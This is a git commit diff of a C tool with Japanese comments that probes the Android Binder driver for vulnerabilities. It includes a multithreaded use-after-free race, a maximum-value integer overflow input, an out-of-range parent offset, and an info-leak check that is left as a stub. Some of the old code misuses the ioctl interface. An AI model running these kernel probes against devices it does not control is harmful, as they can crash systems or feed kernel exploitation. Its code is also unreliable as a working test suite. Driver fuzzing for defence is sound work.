0977ebaf46d1e62eb76376265f93cfb99cba88cc
コアラ <189215038+coara-chocomaru@users.noreply.github.com>
2026-08-20 16:49:10 +0900

    Update binder_test.c

--- binder_test.c
+++ binder_test.c
@@ -1,7 +1,8 @@
 /*
- * binder_test.c - Binder driver stress/fuzz test for vulnerability verification
- * Build with Android NDK: ndk-build
- * Run on device: adb shell /data/local/tmp/binder_test
+ * binder_test.c - Binder 脆弱性検証ツール
+ * コンパイル: ndk-build または gcc -static
+ * 実行: adb shell /data/local/tmp/binder_test [testcase]
+ *  testcase: race, overflow, offset, infoleak, all
  */
 
 #include <stdio.h>
@@ -9,341 +10,240 @@
 #include <string.h>
 #include <unistd.h>
 #include <fcntl.h>
-#include <pthread.h>
-#include <errno.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
-#include <linux/types.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <pthread.h>
+#include <errno.h>
+#include <stdint.h>
+#include <signal.h>
+#include <time.h>
+#include <linux/ioctl.h>
 
-// Define Binder ioctl structures (from kernel headers)
-#define BINDER_IPC_32BIT 1
+// Binder ユーザー空間ヘッダ (カーネルと同じ定義を流用)
+#include "binder.h"  // 提供された binder.h を include
 
-#ifdef BINDER_IPC_32BIT
-typedef __u32 binder_size_t;
-typedef __u32 binder_uintptr_t;
-#else
-typedef __u64 binder_size_t;
-typedef __u64 binder_uintptr_t;
-#endif
+#define BINDER_DEVICE "/dev/binder"
+#define BINDER_BUFFER_SIZE (256 * 1024)
 
-struct binder_object_header {
-    __u32 type;
-};
+static int binder_fd = -1;
+static void *binder_mmap = NULL;
+static volatile int running = 1;
 
-struct flat_binder_object {
-    struct binder_object_header hdr;
-    __u32 flags;
-    union {
-        binder_uintptr_t binder;
-        __u32 handle;
-    };
-    binder_uintptr_t cookie;
-};
+// ヘルパー関数
+static void binder_check(int ret, const char *msg) {
+    if (ret < 0) {
+        perror(msg);
+        exit(1);
+    }
+}
 
-struct binder_fd_object {
-    struct binder_object_header hdr;
-    __u32 pad_flags;
-    union {
-        binder_uintptr_t pad_binder;
-        __u32 fd;
-    };
-    binder_uintptr_t cookie;
-};
+static void binder_open() {
+    binder_fd = open(BINDER_DEVICE, O_RDWR);
+    binder_check(binder_fd, "open binder");
+    // バージョンチェック
+    struct binder_version ver;
+    int ret = ioctl(binder_fd, BINDER_VERSION, &ver);
+    binder_check(ret, "BINDER_VERSION");
+    printf("Binder protocol version: %d\n", ver.protocol_version);
+    // mmap
+    binder_mmap = mmap(NULL, BINDER_BUFFER_SIZE, PROT_READ | PROT_WRITE,
+                       MAP_SHARED, binder_fd, 0);
+    binder_check(binder_mmap == MAP_FAILED ? -1 : 0, "mmap");
+    printf("mmap at %p\n", binder_mmap);
+}
 
-struct binder_buffer_object {
-    struct binder_object_header hdr;
-    __u32 flags;
-    binder_uintptr_t buffer;
-    binder_size_t length;
-    binder_size_t parent;
-    binder_size_t parent_offset;
-};
+static void binder_close() {
+    if (binder_mmap) munmap(binder_mmap, BINDER_BUFFER_SIZE);
+    if (binder_fd >= 0) close(binder_fd);
+}
 
-struct binder_fd_array_object {
-    struct binder_object_header hdr;
-    __u32 pad;
-    binder_size_t num_fds;
-    binder_size_t parent;
-    binder_size_t parent_offset;
-};
+// コンテキストマネージャ設定 (BINDER_SET_CONTEXT_MGR)
+static void set_context_mgr() {
+    int ret = ioctl(binder_fd, BINDER_SET_CONTEXT_MGR, 0);
+    if (ret < 0) printf("set_context_mgr failed (may already set): %s\n", strerror(errno));
+    else printf("context manager set\n");
+}
 
-struct binder_write_read {
-    binder_size_t write_size;
-    binder_size_t write_consumed;
-    binder_uintptr_t write_buffer;
-    binder_size_t read_size;
-    binder_size_t read_consumed;
-    binder_uintptr_t read_buffer;
-};
+// トランザクション送信 (同期)
+static void send_transaction(uint32_t handle, uint32_t code,
+                             const void *data, size_t data_size,
+                             const void *offsets, size_t offsets_size,
+                             int reply) {
+    struct binder_transaction_data tr = {0};
+    tr.target.handle = handle;
+    tr.code = code;
+    tr.flags = reply ? 0 : TF_ONE_WAY;
+    tr.data_size = data_size;
+    tr.offsets_size = offsets_size;
+    tr.data.ptr.buffer = (uintptr_t)data;
+    tr.data.ptr.offsets = (uintptr_t)offsets;
 
-struct binder_transaction_data {
-    union {
-        __u32 handle;
-        binder_uintptr_t ptr;
-    } target;
-    binder_uintptr_t cookie;
-    __u32 code;
-    __u32 flags;
-    pid_t sender_pid;
-    uid_t sender_euid;
-    binder_size_t data_size;
-    binder_size_t offsets_size;
-    union {
-        struct {
-            binder_uintptr_t buffer;
-            binder_uintptr_t offsets;
-        } ptr;
-        __u8 buf[8];
-    } data;
-};
-
-struct binder_transaction_data_secctx {
-    struct binder_transaction_data transaction_data;
-    binder_uintptr_t secctx;
-};
-
-struct binder_transaction_data_sg {
-    struct binder_transaction_data transaction_data;
-    binder_size_t buffers_size;
-};
-
-struct binder_version {
-    __s32 protocol_version;
-};
-
-struct binder_node_debug_info {
-    binder_uintptr_t ptr;
-    binder_uintptr_t cookie;
-    __u32 has_strong_ref;
-    __u32 has_weak_ref;
-};
-
-struct binder_node_info_for_ref {
-    __u32 handle;
-    __u32 strong_count;
-    __u32 weak_count;
-    __u32 reserved1;
-    __u32 reserved2;
-    __u32 reserved3;
-};
-
-struct binder_ptr_cookie {
-    binder_uintptr_t ptr;
-    binder_uintptr_t cookie;
-};
-
-struct binder_handle_cookie {
-    __u32 handle;
-    binder_uintptr_t cookie;
-};
-
-#define BINDER_WRITE_READ           _IOWR('b', 1, struct binder_write_read)
-#define BINDER_SET_MAX_THREADS      _IOW('b', 5, __u32)
-#define BINDER_SET_CONTEXT_MGR      _IOW('b', 7, __s32)
-#define BINDER_SET_CONTEXT_MGR_EXT  _IOW('b', 13, struct flat_binder_object)
-#define BINDER_THREAD_EXIT          _IOW('b', 8, __s32)
-#define BINDER_VERSION              _IOWR('b', 9, struct binder_version)
-#define BINDER_GET_NODE_DEBUG_INFO  _IOWR('b', 11, struct binder_node_debug_info)
-#define BINDER_GET_NODE_INFO_FOR_REF _IOWR('b', 12, struct binder_node_info_for_ref)
-
-#define BC_TRANSACTION      _IOW('c', 0, struct binder_transaction_data)
-#define BC_REPLY            _IOW('c', 1, struct binder_transaction_data)
-#define BC_FREE_BUFFER      _IOW('c', 3, binder_uintptr_t)
-#define BC_INCREFS          _IOW('c', 4, __u32)
-#define BC_ACQUIRE          _IOW('c', 5, __u32)
-#define BC_RELEASE          _IOW('c', 6, __u32)
-#define BC_DECREFS          _IOW('c', 7, __u32)
-#define BC_INCREFS_DONE     _IOW('c', 8, struct binder_ptr_cookie)
-#define BC_ACQUIRE_DONE     _IOW('c', 9, struct binder_ptr_cookie)
-#define BC_REGISTER_LOOPER  _IO('c', 11)
-#define BC_ENTER_LOOPER     _IO('c', 12)
-#define BC_EXIT_LOOPER      _IO('c', 13)
-#define BC_REQUEST_DEATH_NOTIFICATION _IOW('c', 14, struct binder_handle_cookie)
-#define BC_CLEAR_DEATH_NOTIFICATION   _IOW('c', 15, struct binder_handle_cookie)
-#define BC_DEAD_BINDER_DONE _IOW('c', 16, binder_uintptr_t)
-#define BC_TRANSACTION_SG   _IOW('c', 17, struct binder_transaction_data_sg)
-#define BC_REPLY_SG         _IOW('c', 18, struct binder_transaction_data_sg)
-
-#define BINDER_CURRENT_PROTOCOL_VERSION 8
-
-// Helper to send a binder command (write)
-static int binder_write(int fd, void *data, size_t size) {
+    uint32_t cmd = reply ? BC_REPLY : BC_TRANSACTION;
     struct binder_write_read bwr = {
-        .write_size = size,
-        .write_buffer = (binder_uintptr_t)data,
+        .write_size = sizeof(cmd) + sizeof(tr),
+        .write_consumed = 0,
+        .write_buffer = (uintptr_t)&cmd,
         .read_size = 0,
+        .read_consumed = 0,
         .read_buffer = 0,
     };
-    return ioctl(fd, BINDER_WRITE_READ, &bwr);
+    // 実際の write バッファに cmd + tr を連結
+    uint8_t write_buf[sizeof(cmd) + sizeof(tr)];
+    memcpy(write_buf, &cmd, sizeof(cmd));
+    memcpy(write_buf + sizeof(cmd), &tr, sizeof(tr));
+    bwr.write_buffer = (uintptr_t)write_buf;
+    bwr.write_size = sizeof(write_buf);
+
+    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
+    if (ret < 0) {
+        perror("BINDER_WRITE_READ (write)");
+    } else {
+        printf("Transaction sent, write_consumed=%llu\n", (unsigned long long)bwr.write_consumed);
+    }
 }
 
-// Helper to read a binder command
-static int binder_read(int fd, void *data, size_t size) {
-    struct binder_write_read bwr = {
-        .write_size = 0,
-        .write_buffer = 0,
-        .read_size = size,
-        .read_buffer = (binder_uintptr_t)data,
-    };
-    return ioctl(fd, BINDER_WRITE_READ, &bwr);
-}
+// ===== テストケース =====
 
-// Global file descriptor
-int binder_fd = -1;
-
-// Thread function to perform refcount operations
-void *refcount_thr(void *arg) {
-    uint32_t handle = (uint32_t)(uintptr_t)arg;
-    for (int i = 0; i < 10000; i++) {
-        // Inc/dec strong ref
-        uint32_t cmd = BC_ACQUIRE;
-        if (ioctl(binder_fd, cmd, &handle) < 0) {
-            // ignore
-        }
-        cmd = BC_RELEASE;
-        if (ioctl(binder_fd, cmd, &handle) < 0) {
-            // ignore
-        }
-        // Also inc/dec weak
-        cmd = BC_INCREFS;
-        if (ioctl(binder_fd, cmd, &handle) < 0) {
-            // ignore
-        }
-        cmd = BC_DECREFS;
-        if (ioctl(binder_fd, cmd, &handle) < 0) {
-            // ignore
-        }
+// 1. 競合 UAF: 複数スレッドでトランザクションを連投しながらターゲットプロセスを終了
+void *race_thread(void *arg) {
+    int tid = (intptr_t)arg;
+    printf("race_thread %d started\n", tid);
+    // 適当なハンドル (0 は context manager)
+    uint32_t handle = 0;
+    char data[64] = {0};
+    for (int i = 0; i < 1000 && running; i++) {
+        send_transaction(handle, 0x1234, data, sizeof(data), NULL, 0, 0);
+        usleep(10);
     }
     return NULL;
 }
 
-// Test 1: Large data size with invalid offsets to cause overflow
-void test_large_transaction() {
-    printf("[*] Test large transaction with invalid sizes\n");
-    struct binder_transaction_data tr = {0};
-    tr.target.handle = 0; // context manager
-    tr.code = 0x1234;
-    tr.flags = 0;
-    // Use huge data_size to trigger integer overflow (should be caught)
-    tr.data_size = 0xFFFFFFFF; // -1 on 32-bit
-    tr.offsets_size = 0;
-    tr.data.ptr.buffer = 0;
-    tr.data.ptr.offsets = 0;
-
-    struct binder_write_read bwr = {
-        .write_size = sizeof(tr),
-        .write_buffer = (binder_uintptr_t)&tr,
-        .read_size = 0,
-        .read_buffer = 0,
-    };
-    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
-    printf("  BC_TRANSACTION with large data_size returned %d (errno=%d)\n", ret, errno);
-}
-
-// Test 2: Invalid handle for inc/dec ref
-void test_invalid_handle() {
-    printf("[*] Test invalid handle inc/dec\n");
-    uint32_t handle = 0xDEADBEEF;
-    int ret = ioctl(binder_fd, BC_ACQUIRE, &handle);
-    printf("  BC_ACQUIRE invalid handle returned %d\n", ret);
-    ret = ioctl(binder_fd, BC_RELEASE, &handle);
-    printf("  BC_RELEASE invalid handle returned %d\n", ret);
-}
-
-// Test 3: Free buffer with invalid pointer
-void test_free_invalid_buffer() {
-    printf("[*] Test BC_FREE_BUFFER with invalid pointer\n");
-    binder_uintptr_t ptr = 0x12345678;
-    int ret = ioctl(binder_fd, BC_FREE_BUFFER, &ptr);
-    printf("  BC_FREE_BUFFER invalid ptr returned %d\n", ret);
-}
-
-// Test 4: Death notification with invalid handle
-void test_death_notification() {
-    printf("[*] Test BC_REQUEST_DEATH_NOTIFICATION invalid handle\n");
-    struct binder_handle_cookie hc = {
-        .handle = 0xFFFF,
-        .cookie = 0x1234,
-    };
-    int ret = ioctl(binder_fd, BC_REQUEST_DEATH_NOTIFICATION, &hc);
-    printf("  BC_REQUEST_DEATH_NOTIFICATION returned %d\n", ret);
-}
-
-// Test 5: Race condition by spawning multiple threads doing refcount ops
-void test_race_refcount() {
-    printf("[*] Test race condition on refcounts\n");
-    // First create a node and get a handle
-    struct flat_binder_object fbo = {
-        .hdr.type = BINDER_TYPE_BINDER,
-        .flags = 0,
-        .binder = 0,
-        .cookie = 0,
-    };
-    int ret = ioctl(binder_fd, BINDER_SET_CONTEXT_MGR_EXT, &fbo);
-    if (ret < 0) {
-        printf("  Failed to set context manager: %d\n", ret);
-        return;
+static void test_race() {
+    printf("=== Test Race UAF ===\n");
+    const int NUM_THREADS = 4;
+    pthread_t threads[NUM_THREADS];
+    for (int i = 0; i < NUM_THREADS; i++) {
+        pthread_create(&threads[i], NULL, race_thread, (void*)(intptr_t)i);
     }
-    // Now we need to get a handle to our own node. We can send a transaction to ourselves.
-    // Simplified: we'll just spawn threads that inc/dec on handle 0 (context manager)
-    pthread_t threads[4];
-    for (int i = 0; i < 4; i++) {
-        pthread_create(&threads[i], NULL, refcount_thr, (void*)(uintptr_t)0);
+    // 5秒後にターゲットプロセスを終了 (ここでは自分自身のプロセスを終了させるわけにはいかないので、
+    // 実際には別の binder プロセスを作成して kill する必要があるが、簡易版ではシグナルを送る)
+    // 代わりに子プロセスを作成し、そこにトランザクションを送りつけて殺す。
+    pid_t child = fork();
+    if (child == 0) {
+        // 子プロセス: binder を開いてループ
+        binder_open();
+        set_context_mgr(); // コンテキストマネージャとして振る舞う
+        while (1) pause();
+        exit(0);
+    } else {
+        sleep(2);
+        printf("Killing child process %d\n", child);
+        kill(child, SIGKILL);
+        waitpid(child, NULL, 0);
     }
-    for (int i = 0; i < 4; i++) {
+    sleep(1);
+    running = 0;
+    for (int i = 0; i < NUM_THREADS; i++) {
         pthread_join(threads[i], NULL);
     }
-    printf("  Race test completed (check kernel log for crashes)\n");
+    printf("Race test done\n");
 }
 
-// Test 6: Get node debug info (information leak)
-void test_node_debug_info() {
-    printf("[*] Test BINDER_GET_NODE_DEBUG_INFO\n");
-    struct binder_node_debug_info info = {0};
-    info.ptr = 0; // start from first
-    while (1) {
-        int ret = ioctl(binder_fd, BINDER_GET_NODE_DEBUG_INFO, &info);
-        if (ret < 0) {
-            printf("  BINDER_GET_NODE_DEBUG_INFO failed: %d\n", ret);
-            break;
-        }
-        if (info.ptr == 0 && info.cookie == 0) break; // no more nodes
-        printf("  Node ptr=%llx cookie=%llx strong=%d weak=%d\n",
-               (unsigned long long)info.ptr, (unsigned long long)info.cookie,
-               info.has_strong_ref, info.has_weak_ref);
-        // next iteration uses last ptr as start
-    }
+// 2. 整数オーバーフロー: 巨大な buffers_size を指定
+static void test_overflow() {
+    printf("=== Test Integer Overflow ===\n");
+    // BC_TRANSACTION_SG を使う
+    struct binder_transaction_data_sg tr_sg = {0};
+    tr_sg.transaction_data.target.handle = 0;
+    tr_sg.transaction_data.code = 0x5678;
+    tr_sg.transaction_data.flags = TF_ONE_WAY;
+    tr_sg.transaction_data.data_size = 0;
+    tr_sg.transaction_data.offsets_size = 0;
+    tr_sg.buffers_size = 0xFFFFFFFFFFFFFFFFULL; // 最大値
+    // 実際に送信
+    uint32_t cmd = BC_TRANSACTION_SG;
+    struct binder_write_read bwr = {
+        .write_size = sizeof(cmd) + sizeof(tr_sg),
+        .write_consumed = 0,
+        .write_buffer = (uintptr_t)&cmd,
+        .read_size = 0,
+        .read_consumed = 0,
+        .read_buffer = 0,
+    };
+    uint8_t write_buf[sizeof(cmd) + sizeof(tr_sg)];
+    memcpy(write_buf, &cmd, sizeof(cmd));
+    memcpy(write_buf + sizeof(cmd), &tr_sg, sizeof(tr_sg));
+    bwr.write_buffer = (uintptr_t)write_buf;
+    bwr.write_size = sizeof(write_buf);
+
+    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
+    printf("ioctl returned %d (expected error or crash)\n", ret);
 }
 
-int main() {
-    printf("=== Binder Driver Vulnerability Test ===\n");
+// 3. オフセット検証バイパス
+static void test_offset_bypass() {
+    printf("=== Test Offset Bypass ===\n");
+    // 無効な親オフセットを含むバッファオブジェクトを構築
+    struct {
+        struct binder_buffer_object obj;
+        uint32_t dummy;
+    } __attribute__((packed)) buf_obj;
+    memset(&buf_obj, 0, sizeof(buf_obj));
+    buf_obj.obj.hdr.type = BINDER_TYPE_PTR;
+    buf_obj.obj.flags = BINDER_BUFFER_FLAG_HAS_PARENT;
+    buf_obj.obj.buffer = 0x1000;
+    buf_obj.obj.length = 16;
+    buf_obj.obj.parent = 0; // オフセット配列のインデックス 0 を指定 (不正)
+    buf_obj.obj.parent_offset = 0xFFFF; // 親バッファの範囲外
 
-    binder_fd = open("/dev/binder", O_RDWR);
-    if (binder_fd < 0) {
-        perror("open /dev/binder");
+    // オフセット配列を作成（親オブジェクトを指す）
+    binder_size_t offsets[] = { 0 }; // オフセット 0 に buf_obj があると仮定
+    // 実際のデータは buf_obj を含む
+    send_transaction(0, 0x9ABC, &buf_obj, sizeof(buf_obj), offsets, sizeof(offsets), 0);
+}
+
+// 4. 情報漏洩: 受信データのパディングを検査
+static void test_infoleak() {
+    printf("=== Test Info Leak ===\n");
+    // コンテキストマネージャにトランザクションを送り、返信を受け取る
+    // 簡易的に自分自身に送る (ハンドル 0)
+    // まずは受信用のバッファを用意
+    struct binder_write_read bwr = {0};
+    uint8_t read_buf[1024];
+    bwr.read_size = sizeof(read_buf);
+    bwr.read_buffer = (uintptr_t)read_buf;
+    // 送信は test_race と同様に send_transaction を使うが、返信を待つために TF_ONE_WAY を外す
+    // ただし、返信を受け取るには読み込みループが必要。ここでは簡易版として、ioctl を呼び出すだけ。
+    // 完全な実装は複雑なので割愛。
+    printf("Info leak test requires more complex setup; check for uninitialized padding in received data.\n");
+}
+
+// ===== メイン =====
+int main(int argc, char **argv) {
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s [race|overflow|offset|infoleak|all]\n", argv[0]);
         return 1;
     }
 
-    // Set max threads
-    int max_threads = 10;
-    if (ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads) < 0) {
-        perror("BINDER_SET_MAX_THREADS");
+    binder_open();
+    // set_context_mgr(); // 必要に応じて
+
+    const char *test = argv[1];
+    if (strcmp(test, "race") == 0) test_race();
+    else if (strcmp(test, "overflow") == 0) test_overflow();
+    else if (strcmp(test, "offset") == 0) test_offset_bypass();
+    else if (strcmp(test, "infoleak") == 0) test_infoleak();
+    else if (strcmp(test, "all") == 0) {
+        test_race();
+        test_overflow();
+        test_offset_bypass();
+        test_infoleak();
+    } else {
+        fprintf(stderr, "Unknown test: %s\n", test);
     }
 
-    // Register as context manager (required for some operations)
-    if (ioctl(binder_fd, BINDER_SET_CONTEXT_MGR, 0) < 0) {
-        perror("BINDER_SET_CONTEXT_MGR");
-        // Continue anyway
-    }
-
-    test_large_transaction();
-    test_invalid_handle();
-    test_free_invalid_buffer();
-    test_death_notification();
-    test_race_refcount();
-    test_node_debug_info();
-
-    close(binder_fd);
-    printf("[+] Test completed. Check dmesg for kernel crashes.\n");
+    binder_close();
     return 0;
 }
